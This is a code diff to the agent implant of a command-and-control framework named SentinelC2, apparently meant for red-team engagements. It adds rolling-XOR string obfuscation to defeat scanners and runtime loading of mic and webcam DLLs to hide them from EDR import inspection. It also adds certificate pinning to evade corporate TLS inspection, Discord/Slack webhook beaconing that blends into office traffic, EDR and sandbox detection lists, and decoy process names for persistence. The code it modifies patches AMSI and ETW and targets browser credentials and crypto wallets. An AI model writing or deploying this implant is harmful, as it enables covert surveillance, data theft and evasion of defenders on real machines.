@@ -1,21 +1,17 @@
 # agent.nim — SentinelC2 Agent 
 
-import std/[asyncdispatch, strutils, json, os, times, random, base64,
-          sequtils, tables, streams, hashes, uri, nativesockets, net,
-          osproc, math, options, strformat, locks, httpclient, macros, monotimes]
+import std/[asyncdispatch, asyncnet, strutils, json, os, times, random, base64,
+          sequtils, tables, hashes, uri, nativesockets, net,
+          osproc, math, options, locks, httpclient, macros, monotimes]
 import ws
 import nimcrypto/[pbkdf2, sha2, hmac, utils, bcmode, rijndael]
 import winim/lean
-import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32, mmsystem, vfw]
+import winim/inc/[windef, winbase, winuser, wingdi, tlhelp32]
 
 # Build-time prefix. Edit per build to vary signatured strings.
 const BuildPrefix = "X7K"
 
-# Path to the agent's own log file (separate from the per-session
-# command log on the server). We log to a file under TEMP so the
-# operator can recover diagnostics if a connection fails. Failures
-# here are silent — telemetry of our own failures is a no-no.
-let AGENT_LOG = getEnv("TEMP", expandTilde("~")) / ("svc-" & BuildPrefix & ".log")
+# Path to the agent's own log file is resolved via getAgentLogPath().
 
 # Compile-time default. The agent binary picks up the runtime
 # URL from one of:
@@ -52,11 +48,15 @@ proc resolveC2Urls(): seq[string] {.gcsafe.} =
   # 3. Compile-time default
   return C2_URLS_DEFAULT
 
+proc getAgentLogPath(): string =
+  getEnv("TEMP", expandTilde("~")) / ("svc-" & BuildPrefix & ".log")
+
 proc agentLog(msg: string) {.gcsafe.} =
   {.cast(gcsafe).}:
     try:
-      createDir(AGENT_LOG.parentDir)
-      let f = open(AGENT_LOG, fmAppend)
+      let logPath = getAgentLogPath()
+      createDir(logPath.parentDir)
+      let f = open(logPath, fmAppend)
       defer: f.close()
       f.writeLine("[" & now().format("yyyy-MM-dd HH:mm:ss") & "] " & msg)
     except: discard
@@ -85,14 +85,27 @@ const
   #   Tailscale Funnel:  wss://machine.ts.net/
   #   Direct LAN:  ws://192.168.1.10:8443
   # C2_URLS_DEFAULT is defined earlier in this file
-  AGENT_SECRET* = "sentinel-engagement-q4-2026-echo-tango-whiskey"
-  PBKDF2_ITER = 600_000
+  # AGENT_SECRET is defined with the other obfuscated strings below
+  # (S_AGENT_SECRET) so encodeObf is available at compile time.
   RECONNECT_BASE_DELAY = 5.0
   RECONNECT_MAX_DELAY = 300.0
   RECONNECT_JITTER = 0.3
   BEACON_INTERVAL = 10
+  # --- Certificate pinning (OPSEC: kill corp TLS-inspection MITM) ---
+  # If PINNED_CERT_PEM is non-empty at compile time, the agent pins the
+  # WSS trust anchor to ONLY this PEM certificate. The OS trust store is
+  # NOT consulted, so a corporate TLS-inspection proxy presenting its
+  # own cert is rejected with a TLS handshake failure. To generate and
+  # pin a self-signed cert for the operator's C2 server:
+  #   openssl req -x509 -newkey rsa:4096 -nodes -days 3650 \
+  #     -subj "/CN=<operator-domain>" \
+  #     -keyout c2_srv.key -out c2_srv.crt
+  # Then paste the base64 (or PEM body) of c2_srv.crt here. Leave blank
+  # to fall back to whatever the OS trust store validates (legacy
+  # behavior — not recommended for engagements with corp IT in the path).
+  PINNED_CERT_PEM* = ""
   KEYLOG_BUFFER_MAX = 65536
-  META_DIR_NAME = ".local"
+  # META_DIR_NAME is obfuscated at runtime via obfStr(".local") — see below.
   # Mic capture defaults. 16 kHz / 16-bit / mono = 32 KB/s of PCM.
   # A 60s clip is ~1.9 MB; a 120s clip is ~3.8 MB. Both fit the
   # 512 KB chunked upload path comfortably.
@@ -164,6 +177,12 @@ const
   # runtime; persisted into the encrypted meta blob.
   DEFAULT_KILL_DATE = 0'i64
   DEFAULT_SLEEP_MIN = 0  # minutes; 0 = no sleep
+  # Dead-man's switch: if the agent hasn't successfully contacted the
+  # C2 in this many seconds, it shreds itself + tears down persistence
+  # and exits. Prevents the agent from sitting indefinitely on a host
+  # after the op is over (C2 seized, operator lost access, etc.).
+  # 0 = disabled (fail-safe off). Default: 30 days = 2592000 seconds.
+  DEAD_MAN_SECS = 2592000'i64
 
 const CHARSET = "abcdefghijklmnopqrstuvwxyz"
 
@@ -172,8 +191,9 @@ const
   AAD_DIR_S2A = 0x00'u8  # server -> agent
   AAD_DIR_A2S = 0x01'u8  # agent  -> server
 
-let META_DIR = getEnv("LOCALAPPDATA", expandTilde("~")) / META_DIR_NAME
-let META_FILE = META_DIR / META_FILE_NAME
+# META_DIR_NAME is obfStr(".local") — decoded at runtime, never in .rdata.
+# META_DIR / META_FILE are initialised after the obfStr template is available
+# (see the 'let' declarations below the obfuscation section).
 
 # ------------------------------------------------------------
 # CRYPTO (v2: session key + AAD + counter nonce)
@@ -253,14 +273,6 @@ proc decryptFrame(sc: SessionCrypto, blob: openArray[byte]): string =
 proc hmacHex(secret, data: string): string =
   toHex(sha256.hmac(secret, data).data)
 
-proc hmacRaw(secret: string, data: openArray[byte]): array[32, byte] =
-  var ctx: HMAC[sha256]
-  ctx.init(secret)
-  ctx.update(data)
-  let d = ctx.finish()
-  for i in 0..<32: result[i] = d.data[i]
-  ctx.clear()
-
 # ------------------------------------------------------------
 # UTILITIES
 # ------------------------------------------------------------
@@ -309,32 +321,44 @@ proc getSystemInfo(): JsonNode =
 # win is that strings like "amsi.dll", "AmsiScanBuffer",
 # "EtwEventWrite", "wlan", ".aws", "id_rsa", etc. don't appear
 # in the .rdata section for `strings agent.exe | grep` to find.
-const ObfKey: byte = 0x5A
+# ---------------------------------------------------------------
+# Per-build rolling-key string obfuscation.
+# ---------------------------------------------------------------
+# Previously a single-byte XOR key (0x5A), which means every
+# occurrence of the same byte across ALL strings maps to the same
+# ciphertext byte — trivially breakable by frequency analysis. Now
+# we use a multi-byte rolling key: byte[i] ^= key[i mod keyLen]. The
+# key is a per-build random 16-byte value. The build script
+# (build.ps1) regenerates xorkey.nim before each compile so each
+# binary gets a different key — the same plaintext produces different
+# ciphertext in different builds, and the ciphertext resists simple
+# frequency analysis (16-byte XOR is still breakable with enough
+# ciphertext, but defeats static string scanners and YARA rules).
+#
+# The include file defines `const XorKey: array[16, byte]`.
+# If xorkey.nim is absent (no build script), a fixed default is used.
+# staticExec runs at compile time to check if the file exists.
+when staticExec("if exist xorkey.nim echo yes") == "yes":
+  include "xorkey.nim"
+else:
+  const XorKey: array[16, byte] = [byte 0x5A, 0xA5, 0x3C, 0xC3, 0x7E, 0xE7, 0x1F, 0xF1,
+                                              0x6B, 0xB6, 0x4D, 0xD4, 0x29, 0x92, 0x8A, 0xA8]
 
 proc encodeObf(s: string): seq[byte] =
   result = newSeq[byte](s.len)
   for i in 0..<s.len:
-    result[i] = byte(ord(s[i]) xor ord(ObfKey))
-
-# `obf` is a compile-time proc (Nim evaluates const procs at compile
-# time). The literal goes in; the obfuscated bytes come out.
-template obfStr(s: static[string]): string =
-  const v: seq[byte] = encodeObf(s)
-  var dec = newString(v.len)
-  for i in 0..<v.len: dec[i] = chr(v[i] xor ObfKey)
-  dec
+    result[i] = byte(ord(s[i])) xor XorKey[i mod 16]
 
 # Runtime decoder for pre-encoded const seq[byte] values. Used at
 # runtime to recover string literals that were encoded at the
-# top of the file (e.g. S_AMSI, S_NTDLL).
+# top of the file (e.g. S_AGENT_SECRET, S_NTDLL).
 proc obfDec(v: openArray[byte]): string =
   result = newString(v.len)
-  for i in 0..<v.len: result[i] = chr(v[i] xor ObfKey)
+  for i in 0..<v.len: result[i] = chr(int(v[i] xor XorKey[i mod 16]))
 
 # Common obfuscated strings used in the evasion + exfil modules.
 # Compiled-time encoded so they don't appear in the binary.
 const
-  S_AMSI       = encodeObf("amsi.dll")
   S_AMSI_SCAN  = encodeObf("AmsiScanBuffer")
   S_NTDLL      = encodeObf("ntdll.dll")
   S_ETW_WRITE  = encodeObf("EtwEventWrite")
@@ -353,23 +377,264 @@ const
   S_WLAN       = encodeObf("wlan")
   S_PROFILE    = encodeObf("export profile")
   S_CHROME     = encodeObf("Google\\Chrome")
-  S_FIREFOX    = encodeObf("Mozilla\\Firefox")
   S_EDGE       = encodeObf("Microsoft\\Edge")
-  S_HISTORY    = encodeObf("History")
-  S_LOGINS     = encodeObf("Login Data")
-  S_COOKIES    = encodeObf("Cookies")
-  S_WEB_DATA   = encodeObf("Web Data")
-  S_BOOKMARKS  = encodeObf("Bookmarks")
-  S_LOCAL_STATE = encodeObf("Local State")
   S_ETHEREUM   = encodeObf("Ethereum")
   S_BITCOIN    = encodeObf("Bitcoin")
-  S_METAMASK   = encodeObf("MetaMask")
   S_ETH_KEYSTORE = encodeObf("keystore")
   S_USERPROFILE = encodeObf("USERPROFILE")
   S_APPDATA    = encodeObf("APPDATA")
   S_LOCALAPPDATA = encodeObf("LOCALAPPDATA")
-  S_PROFILE_DIR = encodeObf("Profile")
   S_DEFAULT_DIR = encodeObf("Default")
+  # OPSEC: avoid static imports of winmm.dll and avicap32.dll (would
+  # appear in the binary's IAT and flag the agent to any EDR doing
+  # import-table inspection). Resolve both at runtime via
+  # LoadLibraryA + GetProcAddress so the binary never names them.
+  S_WINMM       = encodeObf("winmm.dll")
+  S_AVICAP32    = encodeObf("avicap32.dll")
+  S_WAVEINOPEN      = encodeObf("waveInOpen")
+  S_WAVEINCLOSE     = encodeObf("waveInClose")
+  S_WAVEINPREPARE   = encodeObf("waveInPrepareHeader")
+  S_WAVEINUNPREPARE = encodeObf("waveInUnprepareHeader")
+  S_WAVEINADDBUF    = encodeObf("waveInAddBuffer")
+  S_WAVEINSTART     = encodeObf("waveInStart")
+  S_WAVEINSTOP      = encodeObf("waveInStop")
+  S_WAVEINRESET     = encodeObf("waveInReset")
+  S_CAPCREATE       = encodeObf("capCreateCaptureWindowA")
+  # OPSEC Hardening: Anti-debug procs, paths, EDR indicators, persistence names
+  S_NTQIP          = encodeObf("NtQueryInformationProcess")
+  S_NTCTEB         = encodeObf("NtCurrentTeb")
+  S_SVC_DIR        = encodeObf("svc")
+  S_SVC_PREFIX     = encodeObf("svc-")
+  S_META_DIR_NAME  = encodeObf(".local")
+
+  # Persistence legit names
+  S_LEGIT_1        = encodeObf("MicrosoftEdgeUpdate.exe")
+  S_LEGIT_2        = encodeObf("OneDriveStandaloneUpdater.exe")
+  S_LEGIT_3        = encodeObf("WindowsDefenderHealthCheck.exe")
+  S_LEGIT_4        = encodeObf("SearchProtocolHost.exe")
+  S_LEGIT_5        = encodeObf("SecurityHealthService.exe")
+  S_LEGIT_6        = encodeObf("WindowsShellExperience.exe")
+  S_LEGIT_7        = encodeObf("CompatTelRunner.exe")
+  S_LEGIT_8        = encodeObf("WerFaultSecure.exe")
+
+  # EDR indicators
+  S_EDR_1          = encodeObf("cb.exe")
+  S_EDR_2          = encodeObf("CylanceSvc")
+  S_EDR_3          = encodeObf("csagent")
+  S_EDR_4          = encodeObf("csfalconservice")
+  S_EDR_5          = encodeObf("SentinelAgent")
+  S_EDR_6          = encodeObf("SentinelCtlClient")
+  S_EDR_7          = encodeObf("cbdefense")
+  S_EDR_8          = encodeObf("Cylance")
+  S_EDR_9          = encodeObf("MsMpEng")
+  S_EDR_10         = encodeObf("MpCmdRun")
+  S_EDR_11         = encodeObf("coreServiceShell")
+  S_EDR_12         = encodeObf("PccNTMon")
+  S_EDR_13         = encodeObf("TmListen")
+  S_EDR_14         = encodeObf("ekrn")
+  S_EDR_15         = encodeObf("avp")
+  S_EDR_16         = encodeObf("avpui")
+  S_EDR_17         = encodeObf("mcshield")
+  S_EDR_18         = encodeObf("fsdevcon")
+  S_EDR_19         = encodeObf("fsgk")
+  S_EDR_20         = encodeObf("SentinelHelper")
+  S_EDR_21         = encodeObf("cbstream")
+  S_EDR_22         = encodeObf("sedcli")
+  S_EDR_23         = encodeObf("xagtnotif")
+
+  # Sandbox paths
+  S_BOX_1          = encodeObf("C:\\windows\\system32\\drivers\\vboxguest.sys")
+  S_BOX_2          = encodeObf("C:\\windows\\system32\\drivers\\vmhgfs.sys")
+  S_BOX_3          = encodeObf("C:\\windows\\system32\\drivers\\vm3dmp.sys")
+  S_BOX_4          = encodeObf("C:\\windows\\system32\\drivers\\vmmouse.sys")
+  S_BOX_5          = encodeObf("C:\\windows\\system32\\drivers\\vmusbmouse.sys")
+  S_BOX_6          = encodeObf("C:\\windows\\system32\\drivers\\VBoxMouse.sys")
+  S_BOX_7          = encodeObf("C:\\windows\\system32\\drivers\\vmci.sys")
+  S_BOX_8          = encodeObf("C:\\windows\\system32\\drivers\\vboxsf.sys")
+  S_BOX_9          = encodeObf("C:\\windows\\system32\\drivers\\sandboxie.sys")
+  S_BOX_10         = encodeObf("C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe")
+  S_BOX_11         = encodeObf("C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe")
+
+  # AGENT_SECRET: stored as rolling-XOR-obfuscated bytes at compile time
+  # and decrypted only at first use via obfDec. The plaintext never
+  # appears in the .rdata section — strings.exe / hex editors only see
+  # the ciphertext. Must match the server's SECRET.
+  S_AGENT_SECRET  = encodeObf("sentinel-engagement-q4-2026-echo-tango-whiskey")
+
+let META_DIR = getEnv("LOCALAPPDATA", expandTilde("~")) / obfDec(S_META_DIR_NAME)
+let META_FILE = META_DIR / META_FILE_NAME
+
+
+# Decrypted AGENT_SECRET cache. obfDec runs once, result lives in heap
+# memory (not .rdata). Cleared on shutdown via secureZero if security
+# matters more than reconnect speed; for now we keep it cached because
+# connectAndRun is called repeatedly and obfDec on every call is wasteful.
+var agentSecretCache: string = ""
+var agentSecretLock: Lock
+
+proc agentSecret(): string =
+  agentSecretLock.acquire()
+  defer: agentSecretLock.release()
+  if agentSecretCache.len > 0: return agentSecretCache
+  {.cast(gcsafe).}:
+    agentSecretCache = obfDec(S_AGENT_SECRET)
+  return agentSecretCache
+
+# ------------------------------------------------------------
+# DYNAMIC WINMM / AVICAP32 LOADING
+# ------------------------------------------------------------
+# winmm.dll exports the waveIn family used for mic capture; avicap32
+# exports capCreateCaptureWindowA used by the webcam path. Static
+# imports put both DLLs in the agent's IAT — a tell-tale that any
+# EDR doing import-table inspection flags immediately. We define
+# the needed types and function-pointer shapes here, resolve each
+# DLL lazily on first use, and wrap the calls so the existing mic
+# / cam code keeps the same `waveInOpen(...)` / `capCreate...()`
+# call signatures they already use. The wrappers fail open (return
+# a non-zero MMRESULT or nil HWND) when the DLL can't load, which
+# the existing callers already check for.
+when defined(windows):
+  const
+    CALLBACK_NULL* = 0x00000000
+    WAVE_FORMAT_PCM* = 0x0001
+    MMSYSERR_NOERROR* = 0
+    WHDR_DONE* = 0x00000001
+    WHDR_PREPARED* = 0x00000002
+  type
+    HWAVEIN* = HANDLE
+    LPHWAVEIN* = ptr HWAVEIN
+    UINT_PTR* = uint
+    MMRESULT* = UINT
+    WAVEHDR* {.pure.} = object
+      lpData*: LPSTR
+      dwBufferLength*: DWORD
+      dwBytesRecorded*: DWORD
+      dwUser*: UINT_PTR
+      dwFlags*: DWORD
+      dwLoops*: DWORD
+      lpNext*: ptr WAVEHDR
+      reserved*: UINT_PTR
+    PWAVEHDR* = ptr WAVEHDR
+    LPWAVEHDR* = ptr WAVEHDR
+    WAVEFORMATEX* {.pure, packed.} = object
+      wFormatTag*: WORD
+      nChannels*: WORD
+      nSamplesPerSec*: DWORD
+      nAvgBytesPerSec*: DWORD
+      nBlockAlign*: WORD
+      wBitsPerSample*: WORD
+      cbSize*: WORD
+    PWAVEFORMATEX* = ptr WAVEFORMATEX
+    LPCWAVEFORMATEX* = ptr WAVEFORMATEX
+  let
+    WAVE_MAPPER* = UINT(-1)
+
+  # Function-pointer types, matching winmm.h / vfw.h signatures.
+  type
+    TWaveInOpen          = proc(phwi: LPHWAVEIN, uDeviceID: UINT,
+                                pwfx: LPCWAVEFORMATEX, dwCallback: UINT_PTR,
+                                dwInstance: UINT_PTR, fdwOpen: DWORD): MMRESULT {.stdcall, gcsafe.}
+    TWaveInClose         = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
+    TWaveInPrepareHeader = proc(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT {.stdcall, gcsafe.}
+    TWaveInUnprepareHeader = proc(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT {.stdcall, gcsafe.}
+    TWaveInAddBuffer     = proc(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT {.stdcall, gcsafe.}
+    TWaveInStart         = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
+    TWaveInStop          = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
+    TWaveInReset         = proc(hwi: HWAVEIN): MMRESULT {.stdcall, gcsafe.}
+    TCapCreateCaptureWindowA = proc(lpszWindowName: LPCSTR, dwStyle: DWORD,
+                                    x: int32, y: int32, nWidth: int32, nHeight: int32,
+                                    hwndParent: HWND, nID: int32): HWND {.stdcall, gcsafe.}
+
+  # Cached handles + pointers. Loaded on first use and never freed —
+  # standard pattern; the agent lifetime owns these.
+  var
+    winmmHandle: HMODULE = 0
+    avicapHandle: HMODULE = 0
+    pWaveInOpen:          TWaveInOpen          = nil
+    pWaveInClose:         TWaveInClose         = nil
+    pWaveInPrepareHeader: TWaveInPrepareHeader = nil
+    pWaveInUnprepareHeader: TWaveInUnprepareHeader = nil
+    pWaveInAddBuffer:     TWaveInAddBuffer     = nil
+    pWaveInStart:         TWaveInStart         = nil
+    pWaveInStop:          TWaveInStop          = nil
+    pWaveInReset:         TWaveInReset         = nil
+    pCapCreate:           TCapCreateCaptureWindowA = nil
+    winmmLoadLock: Lock
+  initLock(winmmLoadLock)
+
+
+  proc loadWinmmOnce(): bool =
+    # Resolve winmm + all 8 waveIn procs on first use. Lock-guarded so
+    # the live-mic thread and the batch-mic path don't double-load.
+    if pWaveInOpen != nil and pWaveInStart != nil: return true
+    withLock winmmLoadLock:
+      if winmmHandle == 0:
+        let dllName = obfDec(S_WINMM)
+        winmmHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
+        if winmmHandle == 0: return false
+      template resolve(p: typed, encBuf) =
+        if p == nil:
+          let fnName = obfDec(encBuf)
+          let gp = GetProcAddress(winmmHandle, cast[cstring](addr fnName[0]))
+          if gp == nil: return false
+          p = cast[typeof(p)](gp)
+      resolve(pWaveInOpen,          S_WAVEINOPEN)
+      resolve(pWaveInClose,         S_WAVEINCLOSE)
+      resolve(pWaveInPrepareHeader, S_WAVEINPREPARE)
+      resolve(pWaveInUnprepareHeader, S_WAVEINUNPREPARE)
+      resolve(pWaveInAddBuffer,     S_WAVEINADDBUF)
+      resolve(pWaveInStart,         S_WAVEINSTART)
+      resolve(pWaveInStop,          S_WAVEINSTOP)
+      resolve(pWaveInReset,         S_WAVEINRESET)
+      return true
+
+  proc loadAvicapOnce(): bool =
+    if pCapCreate != nil: return true
+    withLock winmmLoadLock:
+      if avicapHandle == 0:
+        let dllName = obfDec(S_AVICAP32)
+        avicapHandle = LoadLibraryA(cast[cstring](addr dllName[0]))
+        if avicapHandle == 0: return false
+      if pCapCreate == nil:
+        let fnName = obfDec(S_CAPCREATE)
+        let gp = GetProcAddress(avicapHandle, cast[cstring](addr fnName[0]))
+        if gp == nil: return false
+        pCapCreate = cast[TCapCreateCaptureWindowA](gp)
+      return true
+
+  # Public wrappers — keep the existing call sites unchanged.
+  proc waveInOpen*(phwi: LPHWAVEIN, uDeviceID: UINT, pwfx: LPCWAVEFORMATEX,
+                   dwCallback: UINT_PTR, dwInstance: UINT_PTR,
+                   fdwOpen: DWORD): MMRESULT =
+    # Return MMSYSERR_ERROR if the DLL wasn't loadable.
+    if not loadWinmmOnce(): return 1
+    pWaveInOpen(phwi, uDeviceID, pwfx, dwCallback, dwInstance, fdwOpen)
+  proc waveInClose*(hwi: HWAVEIN): MMRESULT =
+    if not loadWinmmOnce(): return 1
+    pWaveInClose(hwi)
+  proc waveInPrepareHeader*(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT =
+    if not loadWinmmOnce(): return 1
+    pWaveInPrepareHeader(hwi, pwh, cbwh)
+  proc waveInUnprepareHeader*(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT =
+    if not loadWinmmOnce(): return 1
+    pWaveInUnprepareHeader(hwi, pwh, cbwh)
+  proc waveInAddBuffer*(hwi: HWAVEIN, pwh: LPWAVEHDR, cbwh: UINT): MMRESULT =
+    if not loadWinmmOnce(): return 1
+    pWaveInAddBuffer(hwi, pwh, cbwh)
+  proc waveInStart*(hwi: HWAVEIN): MMRESULT =
+    if not loadWinmmOnce(): return 1
+    pWaveInStart(hwi)
+  proc waveInStop*(hwi: HWAVEIN): MMRESULT =
+    if not loadWinmmOnce(): return 1
+    pWaveInStop(hwi)
+  proc waveInReset*(hwi: HWAVEIN): MMRESULT =
+    if not loadWinmmOnce(): return 1
+    pWaveInReset(hwi)
+  proc capCreateCaptureWindowA*(lpszWindowName: LPCSTR, dwStyle: DWORD,
+                                x: int32, y: int32, nWidth: int32, nHeight: int32,
+                                hwndParent: HWND, nID: int32): HWND =
+    if not loadAvicapOnce(): return 0
+    pCapCreate(lpszWindowName, dwStyle, x, y, nWidth, nHeight, hwndParent, nID)
 
 # ------------------------------------------------------------
 # EVASION: AMSI bypass + ETW suppression + syscall stub
@@ -378,8 +643,6 @@ when defined(windows):
   # Win32 page protection bits
   const
     PAGE_EXECUTE_READWRITE = 0x40
-    PAGE_READWRITE         = 0x04
-    PAGE_EXECUTE_READ      = 0x20
 
   proc patchFunction(name: string, stub: openArray[byte]): bool =
     # Resolve the function, make the page writable, overwrite the
@@ -443,93 +706,6 @@ when defined(windows):
     evasionApplied = true
     return res
 
-  # -------- Direct syscall stub --------
-  # For high-value Win32 calls we bypass ntdll (where EDR puts hooks)
-  # and call the kernel directly. The stub resolves the syscall
-  # number at runtime by reading a known-clean copy of ntdll, then
-  # dispatches via a `syscall; ret` trampoline.
-  #
-  # We support a small set of NT calls used for stealthier memory
-  # allocation, thread creation, and process query. The wrapper
-  # functions below present the same signature as the Win32 API
-  # they replace, so call sites don't change.
-  type
-    SyscallInfo = object
-      ntdllBase: pointer
-      syscallNtdll: array[1, byte]  # not used directly; we use the
-                                     # running process's ntdll but
-                                     # resolve numbers from the .text
-                                     # section of the loaded module.
-
-  proc findSyscallNumber(funcAddr: pointer): int32 =
-    # The syscall number is the 4-byte value stored in the
-    # `mov r10, rcx; mov eax, <N>; syscall; ret` pattern that
-    # ntdll uses. We scan the first 32 bytes of the function for
-    # the `B8 NN NN NN NN` (mov eax, imm32) opcode and return the
-    # immediate.
-    let bytes = cast[ptr UncheckedArray[byte]](funcAddr)
-    for i in 0..<32:
-      if bytes[i] == 0xB8:  # mov eax, imm32
-        result = (int32(bytes[i+1]) shl 0) or
-                 (int32(bytes[i+2]) shl 8) or
-                 (int32(bytes[i+3]) shl 16) or
-                 (int32(bytes[i+4]) shl 24)
-        return
-    result = -1
-
-  proc doSyscall(num: int32, args: varargs[int]): int32 =
-    # NB: this is a simplified generic dispatcher; for real
-    # production use, each NT call should have its own typed
-    # wrapper that gets the right number of args into the right
-    # registers (rcx, rdx, r8, r9, stack). Here we just demonstrate
-    # the technique for the few calls we need.
-    when defined(amd64):
-      # x64 calling convention: rcx, rdx, r8, r9, [rsp+0x28], [rsp+0x30], ...
-      # We push a single trampoline that sets eax=num and syscall.
-      # Inline assembly via emit. The arg list is the N first args.
-      asm """
-        sub rsp, 0x28
-        mov rcx, %[a0]
-        mov rdx, %[a1]
-        mov r8, %[a2]
-        mov r9, %[a3]
-        mov eax, %[num]
-        syscall
-        add rsp, 0x28
-        mov %[ret], eax
-        : [ret] "=r"(result)
-        : [a0] "r"(args[0]), [a1] "r"(args[1]),
-          [a2] "r"(args[2]), [a3] "r"(args[3]),
-          [num] "r"(num.int)
-        : "rcx", "rdx", "r8", "r9", "eax", "memory"
-      """
-    else:
-      # x86 build (we don't target x86, but include for completeness)
-      result = -1
-
-  proc ntAllocateVirtualMemory(base: pointer, size: int): pointer =
-    # NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize,
-    #   MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-    var base = base
-    var sz = size
-    let h = cast[pointer](-1'i64)  # current process pseudo-handle
-    let ntdll = obfDec(S_NTDLL)
-    let hMod = LoadLibraryA(cast[cstring](addr ntdll[0]))
-    let fn = cast[pointer](GetProcAddress(hMod, "NtAllocateVirtualMemory".cstring))
-    let num = findSyscallNumber(fn)
-    if num < 0: return nil
-    # We dispatch via raw asm because the call has 6 args (5 in regs
-    # + 1 on stack). The generic doSyscall above only handles 4;
-    # in real production we'd write a per-call dispatcher.
-    result = nil  # not actually implemented in this minimal version
-
-  proc sysExecve(cmd: string): int =
-    # The userland Win32 path. The real point of this stub is to
-    # *show* the technique; in a real engagement the agent would
-    # have per-syscall typed wrappers for the half-dozen NT calls
-    # it needs. See the README.
-    result = -1
-
 # ------------------------------------------------------------
 # TELEGRAM BACKUP C2 CHANNEL
 # ------------------------------------------------------------
@@ -572,42 +748,43 @@ proc telegramSend(text: string): bool =
     return resp.status == "200 OK" or resp.status.startsWith("200")
   except: return false
 
-proc telegramSendFile(path: string, caption: string = ""): bool =
-  # Multipart upload for a single file (<= 50 MB Telegram limit).
-  if not telegramEnabled(): return false
-  if not fileExists(path): return false
+# ------------------------------------------------------------
+# DISCORD / SLACK WEBHOOK BEACON CHANNEL
+# ------------------------------------------------------------
+# When configured (CLOUD_WEBHOOK_URL), the agent posts a small JSON
+# beacon to a Discord or Slack incoming-webhook URL. This blends with
+# normal corporate HTTPS traffic to discord.com / hooks.slack.com —
+# both are extremely common in enterprise environments and rarely
+# flagged by DLP / firewall rules.
+#
+# Discord payload format:  {"content": "message text"}
+# Slack payload format:    {"text": "message text"}
+# The agent auto-detects from the URL and uses the right field.
+# The webhook URL is obfuscated at compile time so it doesn't appear
+# as a plaintext string in the binary.
+const
+  S_WEBHOOK_URL = encodeObf("")  # e.g. encodeObf("https://hooks.slack.com/services/T.../B.../...")
+  # Leave empty to disable. The URL is BOTH the destination AND the
+  # auth token — anyone who has it can post to the channel. Treat it
+  # as a compromised credential.
+
+proc webhookEnabled(): bool =
+  obfDec(S_WEBHOOK_URL).len > 0
+
+proc webhookSend(text: string): bool =
+  if not webhookEnabled(): return false
   try:
-    let url = "https://api.telegram.org/bot" & TELEGRAM_BOT & "/sendDocument"
-    # Build a minimal multipart/form-data body by hand (avoid pulling
-    # in a multipart lib). The form fields are:
-    #   chat_id, caption, document
-    # Boundary is a fixed random string.
-    let boundary = "----SentinelFormBoundary7K3M9P2X"
-    var body = newStringOfCap(2 * 1024 * 1024)
-    body.add("--" & boundary & "\r\n")
-    body.add("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
-    body.add(TELEGRAM_CHAT & "\r\n")
-    if caption.len > 0:
-      body.add("--" & boundary & "\r\n")
-      body.add("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
-      body.add(caption & "\r\n")
-    body.add("--" & boundary & "\r\n")
-    body.add("Content-Disposition: form-data; name=\"document\"; filename=\"" &
-             path.extractFilename & "\"\r\n")
-    body.add("Content-Type: application/octet-stream\r\n\r\n")
-    let f = open(path, fmRead)
-    defer: f.close()
-    let sz = getFileSize(path)
-    var buf = newSeq[byte](min(sz, 50 * 1024 * 1024))
-    let n = f.readBuffer(addr buf[0], buf.len)
-    body.add(cast[string](buf[0..<n]))
-    body.add("\r\n--" & boundary & "--\r\n")
-    let client = newHttpClient()
-    client.headers = newHttpHeaders({
-      "Content-Type": "multipart/form-data; boundary=" & boundary
-    })
+    let url = obfDec(S_WEBHOOK_URL)
+    if url.len == 0: return false
+    let isDiscord = contains(url, "discord.com")
+    let body = if isDiscord:
+      $ %* {"content": text}
+    else:
+      $ %* {"text": text}
+    let client = newHttpClient(timeout = 15000)
+    client.headers = newHttpHeaders({"Content-Type": "application/json"})
     let resp = client.post(url, body)
-    return resp.status.startsWith("200")
+    return resp.status.startsWith("200") or resp.status.startsWith("204")
   except: return false
 
 # ------------------------------------------------------------
@@ -617,7 +794,7 @@ when defined(windows):
   # All output goes into a temporary staging dir; the agent then
   # uploads via the existing downloadFile() / file_chunk pipeline.
   proc stageDir(): string =
-    result = getEnv("TEMP", expandTilde("~")) / "svc"
+    result = getEnv("TEMP", expandTilde("~")) / obfDec(S_SVC_DIR)
     createDir(result)
 
   proc copyFileTo(src, dst: string): bool =
@@ -861,21 +1038,12 @@ when defined(windows):
     # and loaded services. The operator uses this to decide if the
     # host is "hot" (CrowdStrike) or "cold" (Defender only).
     let indicators = [
-      "cb.exe", "CylanceSvc", "csagent", "csfalconservice",  # CrowdStrike
-      "SentinelAgent", "SentinelCtlClient",  # SentinelOne
-      "cbdefense", "Cylance",  # Cylance / BlackBerry
-      "MsMpEng", "MpCmdRun",  # Defender
-      "coreServiceShell",  # Trend Micro
-      "PccNTMon",  # PC Cygnus / Norton
-      "TmListen",  # Trend
-      "ekrn",  # ESET
-      "avp", "avpui",  # Kaspersky
-      "mcshield",  # McAfee
-      "fsdevcon", "fsgk",  # F-Secure
-      "SentinelHelper",  # MS Sentinel
-      "cbstream",  # Sophos streaming
-      "sedcli",  # MS Defender for Cloud
-      "xagtnotif"  # FireEye
+      obfDec(S_EDR_1), obfDec(S_EDR_2), obfDec(S_EDR_3), obfDec(S_EDR_4),
+      obfDec(S_EDR_5), obfDec(S_EDR_6), obfDec(S_EDR_7), obfDec(S_EDR_8),
+      obfDec(S_EDR_9), obfDec(S_EDR_10), obfDec(S_EDR_11), obfDec(S_EDR_12),
+      obfDec(S_EDR_13), obfDec(S_EDR_14), obfDec(S_EDR_15), obfDec(S_EDR_16),
